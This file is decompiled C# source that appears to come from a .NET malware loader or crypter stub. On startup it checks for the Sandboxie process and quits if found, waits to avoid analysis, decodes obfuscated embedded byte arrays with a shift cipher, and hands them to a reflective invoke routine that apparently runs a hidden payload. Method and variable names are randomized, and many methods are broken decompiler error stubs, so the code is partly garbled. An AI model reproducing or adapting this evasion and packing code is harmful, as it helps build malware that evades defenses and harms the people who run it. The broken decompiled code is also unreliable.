using System;
using System.Collections;
using System.Collections.Generic;
using System.Deployment.Internal.Isolation.Manifest;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reflection.Emit;
using System.Runtime;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32.SafeHandles;

public class GForm0 : Form
{
	public delegate object GDelegate0();

	public delegate byte[] GDelegate1(string data);

	public delegate object GDelegate2();

	public delegate object GDelegate3(object S);

	public delegate OpCode GDelegate4(string s);

	public delegate object GDelegate5(object s);

	public static bool BND = false;

	public static int ttlcnt = 0;

	public static bool firstpass = true;

	public static int procCount = 0;

	public static byte[] rh43QoEwgO;

	public static byte[] byte_0;

	public static byte[] B59;

	public StringBuilder sbsource;

	private string b51SjWazalfxu;

	private static string LHp53qCvOxUEOUQctI = "2";

	public static string roPP = "0";

	public static int cID;

	public static object object_0;

	internal static GDelegate1 D = (GDelegate1)ALwj();

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new GForm0());
	}

	public GForm0()
	{
		((Form)this).add_Load((EventHandler)fmRe79ISnBoaC);
		sbsource = new StringBuilder();
		b51SjWazalfxu = "RN";
	}

	private void fmRe79ISnBoaC(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string text = process.ProcessName.ToLower();
			if (Operators.CompareString(text, "sandboxierpcss", false) == 0 && Process.GetCurrentProcess().SessionId == process.SessionId)
			{
				Environment.Exit(0);
			}
		}
		Thread.Sleep(10000);
		Areal();
		kBytes();
		GClass7.bnder();
		if (!BND)
		{
			try
			{
				Thread.Sleep(2000);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		ProjectData.EndApp();
	}

	private static void bndR9()
	{
	}

	private static void Areal()
	{
		B59 = (byte[])wt31LcDcnhzj(GClass6.smethod_0(Conversions.ToString(GClass6.zSr96VjrsCaUxzg()), "2"));
		rh43QoEwgO = (byte[])wt31LcDcnhzj(smethod_2(Conversions.ToString(GClass2.vR19FFEJtmtYykB()), LHp53qCvOxUEOUQctI));
	}

	private static void kBytes()
	{
		byte_0 = (byte[])wt31LcDcnhzj(GClass6.smethod_0(Conversions.ToString(GClass1.vR19FFEJtmtYykB()), "CWMDR"));
		smethod_1(B59, new object[2] { rh43QoEwgO, byte_0 }, "艾西维ほすいに", "杰迪艾艾尺こ");
	}

	public static void smethod_0()
	{
	}

	private static object ALwj()
	{
		return (GDelegate1)GClass3.Rnanw9();
	}

	public static object wt31LcDcnhzj(string f32sekrJjiyo)
	{
		return D(f32sekrJjiyo);
	}

	public static object smethod_1(byte[] QUi9YvOnOZTlVr, object[] tvci3kacUtWByhVpgXl, string ec4iEFPmTwM, string fZg5HwnCM)
	{
		return GClass3.SdX89sCaUxzgmGO(QUi9YvOnOZTlVr, tvci3kacUtWByhVpgXl);
	}

	public static string smethod_2(string value, string pass)
	{
		ArrayList arrayList = new ArrayList();
		int i = 0;
		checked
		{
			for (int length = value.Length; i < length; i++)
			{
				char data = value[i];
				int num = GClass6.Pq110KGRix(data);
				int data2 = (int)Math.Round((double)num - Conversions.ToDouble(pass));
				char c = GClass6.SdX89sCaUxzgmGO(data2);
				arrayList.Add(c);
			}
			return Conversions.ToString(jndata(arrayList));
		}
	}

	private static object jndata(object o)
	{
		Type typeFromHandle = typeof(Strings);
		object[] array = new object[2];
		array[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(o, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
		array[1] = "";
		object[] array2 = array;
		bool[] array3 = new bool[2] { true, false };
		object result = NewLateBinding.LateGet((object)null, typeFromHandle, "Join", array2, (string[])null, (Type[])null, array3);
		if (array3[0])
		{
			NewLateBinding.LateSetComplex(o, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
			return result;
		}
		return result;
	}

	private static object apndta(object s)
	{
		return s;
	}

	static IdnMapping bipUhgwzDuTibLt()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static RegistryAccessRule lHjnCxguUUuEQsM()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static List<>.Enumerator uSkKkvpIrOxJOLW()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static ReadDelegate dszCLidHJpvPXMr()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static UnauthorizedAccessException cdbgRYfvXWmceWv()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static MuiResourceMapEntry bHEmavlcqBjjWWx()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static SafeLsaMemoryHandle wJlFjIamaXRjgEn()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static FileEntry QWSduvRSczgKZGN()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static IOUtil jrgMIIGLwpwbCnD()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static SerializationObjectManager wzrRtYJEsNEuITC()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static GCLatencyMode EreFbnDjBnrRFDw()
	{
		/*Error: stloc 3 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}
}
